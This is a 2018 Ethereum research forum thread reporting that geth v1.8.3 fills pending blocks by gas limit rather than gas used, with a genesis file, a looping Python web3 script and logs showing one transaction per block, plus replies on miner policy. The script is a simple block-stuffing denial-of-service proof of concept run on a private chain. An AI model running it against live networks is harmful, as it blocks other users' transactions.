---
source: ethresearch
topic_id: 2699
title: Go-ethereum network DoS, but main net is not vulnerable. Why?
author: fastchain
date: "2018-07-25"
category: Security
tags: [security]
url: https://ethresear.ch/t/go-ethereum-network-dos-but-main-net-is-not-vulnerable-why/2699
views: 1960
likes: 1
posts_count: 4
---

# Go-ethereum network DoS, but main net is not vulnerable. Why?

Hello,

the full description of the problem is here



      [github.com/ethereum/go-ethereum](https://github.com/ethereum/go-ethereum/issues/17159)












####



        opened 03:36AM - 11 Jul 18 UTC



          closed 08:26AM - 11 Jul 18 UTC



        [![](https://ethresear.ch/uploads/default/original/3X/3/8/3878f982876350e7c2513188018045de60c37a49.png)
          fastchain](https://github.com/fastchain)










#### System information

Geth version: v1.8.3-stable
OS & Version: linux-amd6[…]()4
Commit hash : 329ac18e
Banner: Geth/v1.8.3-stable-329ac18e/linux-amd64/go1.10

#### Expected behaviour
Pending block should include transactions  by sum of actual spent gas.

#### Actual behaviour
Pending block includes  transactions  by sum of transactions gas limit.

#### Steps to reproduce the behaviour
1. Init new chain with
```
{
    "config": {
        "chainId": 88658,
        "homesteadBlock": 0,
        "eip155Block": 0,
        "eip158Block": 0
    },
    "coinbase" : "0x0000000000000000000000000000000000000000",
    "difficulty" : "0x1",
    "extraData" : "0x00",
    "gasLimit" : "0x47e7c5",
    "nonce" : "0x0000000000000042",
    "mixhash" : "0x0000000000000000000000000000000000000000000000000000000000000000",
    "parentHash" : "0x0000000000000000000000000000000000000000000000000000000000000000",
    "timestamp" : "0x00",
    "alloc" : {
        "0xcc89924c686db81e592329e86a06339995362931": {"balance": "888888888888888888888888"}
    }
}

```

1. Send siqence of transactions with maximum possible (according to block limit) gas.
```

import json
import web3
import time
from web3 import Web3, HTTPProvider, TestRPCProvider, IPCProvider

web3 = Web3(HTTPProvider('http://localhost:40000'))

print(web3.personal.unlockAccount(web3.eth.coinbase, ''))
print(web3.eth.blockNumber)
while True:
    time.sleep(1)
    print(web3.eth.sendTransaction({'to':  Web3.toChecksumAddress('0xe778cf0902521dd08162c3e614718a4b4b19542d'), 'from': web3.eth.coinbase, 'value': 1,'gas':4712388}))

#4712388 -- block gas limit

```
2. Wait until transactions will be mined
3. v1.8.3-stable mines only one transaction per block disregard how much gas actually spent

#### DoS Attack scenario

Malicious actor can create sequince of transactions with  gas limit equal to block gas limit each, so no other transactions will be included into pending block from the pool. Since actual gas consumption for ether transfer is low, this attack costs almost nothing.

#### Trace

```
INFO [07-11|05:29:58] Submitted transaction                    fullhash=0xe4dc8ed35c62aee6e2c411f2a1bbaff8c5c7a73cc0e5e4f0feb049908745eda1 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:00] Submitted transaction                    fullhash=0xf3bbd062b9315f8c77fac086077984c59e6822aa5ae77acd24509701f448b5d8 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:01] Submitted transaction                    fullhash=0xab29d1bc6f328ede1f9a1197a86da5928c6cae4f150aa7be7931e2fe2efea24b recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:03] Submitted transaction                    fullhash=0x5a3f99727605abb86014c13ff15b6653235526b0f8dd2912f75ca46e96d25c26 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:04] Submitted transaction                    fullhash=0xb42f3bd646e11526a68cc4bf5ef9aaea9a1e425fa6005047198a9899b59a394a recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:06] Submitted transaction                    fullhash=0xabeb3ddb5337cd52cfdbf090eb28657ff0ac2b1a59cd6004dd94b1c3ecba4039 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:07] Successfully sealed new block            number=295709 hash=047ff8…42b042
INFO [07-11|05:30:07] 🔗 block reached canonical chain          number=295704 hash=c1a583…126861
INFO [07-11|05:30:07] 🔨 mined potential block                  number=295709 hash=047ff8…42b042
INFO [07-11|05:30:07] Commit new mining work                   number=295710 txs=1 uncles=0 elapsed=284.088µs
INFO [07-11|05:30:07] Submitted transaction                    fullhash=0x4181f7fec0beeb185119fe23251430cbfca6515165140f06d1bbf1f2f4da3769 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:08] Successfully sealed new block            number=295710 hash=d1c77e…bea301
INFO [07-11|05:30:08] 🔗 block reached canonical chain          number=295705 hash=94a366…4026e6
INFO [07-11|05:30:08] 🔨 mined potential block                  number=295710 hash=d1c77e…bea301
INFO [07-11|05:30:08] Commit new mining work                   number=295711 txs=1 uncles=0 elapsed=176.021µs
INFO [07-11|05:30:09] Submitted transaction                    fullhash=0x868dd337834ffb2667dd6c010bfd9a4bbe38ea1349fbd9e0ca5df07346bb8228 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:10] Submitted transaction                    fullhash=0x88fc983a2c0754f92715118f3838b95d1ca73b9fc7672825eefa6cdba1c6d168 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:12] Submitted transaction                    fullhash=0x31147a9f6211dac7a99ba2f521b7f142a5368a373192789ea943cec1d8da408d recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:13] Submitted transaction                    fullhash=0x7a9c897fdea1d747e8b0afbec50cec73f604c554f64ea563c83dab567b787d65 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:15] Submitted transaction                    fullhash=0xdaf37c1f8c9548e072f5d4b99ac2b3280b932937fff553a19534eba1ca6c2693 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:16] Successfully sealed new block            number=295711 hash=fe5034…4ea454
INFO [07-11|05:30:16] 🔗 block reached canonical chain          number=295706 hash=a2cf5c…c178cf
INFO [07-11|05:30:16] 🔨 mined potential block                  number=295711 hash=fe5034…4ea454
INFO [07-11|05:30:16] Commit new mining work                   number=295712 txs=1 uncles=0 elapsed=261.808µs
INFO [07-11|05:30:17] Submitted transaction                    fullhash=0x82c6e849c5b32d08c7462dfad566ea7ac918ec645afafb302fe29c10f954b51b recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:18] Submitted transaction                    fullhash=0x1b394526d32fe84796b0ed1d5a2444e53171cf5c7920854ccfb7ad38c8fb19e2 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:20] Submitted transaction                    fullhash=0x5dc9ed2694edc925020a2f67fe08e30143dbf339e271f8651e61e02e0fc0b445 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:21] Submitted transaction                    fullhash=0x321c23b254820e4a8b390ec18967866327c046cdb3a2809601a7da39683e61c3 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:23] Submitted transaction                    fullhash=0x14efaac9f3c3b30abe7b3d6580842c29cc8f06ce8b05e699d23664329293c004 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:24] Submitted transaction                    fullhash=0x01faf3b02dc67e94d65a2bf38cc7d0a855d630a805cc6cc396092b63a792efde recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:26] Submitted transaction                    fullhash=0x31cfd7adce9ffd01fef1ef91e3ff0e49ab6554d19a3a694d1b818a967468e00c recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:27] Submitted transaction                    fullhash=0xc256539e8b4118259225813544df4fd69c2838d26ce63689f9579036e3095ba6 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:29] Submitted transaction                    fullhash=0xe035b61b8430e128652cd1c32f1745302b1488cb983cb2bae9836bab276187c8 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:30] Submitted transaction                    fullhash=0xc60074bff00ee1f40ce53550c9ba89ea721352245430ff74afed9fbe25a193bc recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:32] Submitted transaction                    fullhash=0x90c6d82e8fec268b8f91a67f02320db183a7d0c71c0b6386fdecefe49ae40782 recipient=0xE778CF0902521Dd08162C3e614718a4b4b19542d
INFO [07-11|05:30:33] Successfully sealed new block            number=295712 hash=b43c36…e728b7
INFO [07-11|05:30:33] 🔗 block reached canonical chain          number=295707 hash=3f2c86…8dd164
INFO [07-11|05:30:33] 🔨 mined potential block                  number=295712 hash=b43c36…e728b7
INFO [07-11|05:30:33] Commit new mining work                   number=295713 txs=1 uncles=0 elapsed=335.136µs
```
as you may see, there is only one transaction per block












go-ethereum devs says, that it is safe behaviour (it’s quite strange statment).

This behaviour could not be reproduced on the main net. So it seems that main net uses different pending block creation rules. Could you please explain this rules, or where I can read about it?

Thank you.

## Replies

**kladkogex** (2018-07-25):

This is the from the yellowpaper

> Note the final condition; the sum of the transaction’s
> gas limit, Tg, and the gas utilised in this block prior, given
> by `(BR)u, must be no greater than the block’s gasLimit,
> BHl

So the security problem is in the yellow paper. On the other hand

miners can enforce additional restrictions since it is in their interest

to maximize gas earned.

Thats what they probably do on the main net, the question is where is it implemented in the source code.

---

**fastchain** (2018-07-26):

Dear [@kladkogex](/u/kladkogex)

Thank you for your reply.

> the question is where is it implemented in the source code.

Could you please recommend the right place to ask about implementation of this kind of  software?

---

**kladkogex** (2018-07-26):

I think you need to talk to miners of the main net. They create blocks.

They may use special purpose software - not geth default, or geth with non-default parameters … Theoretically miners include whatever they deem good for themselves subject to the contstraint of block gas limit.

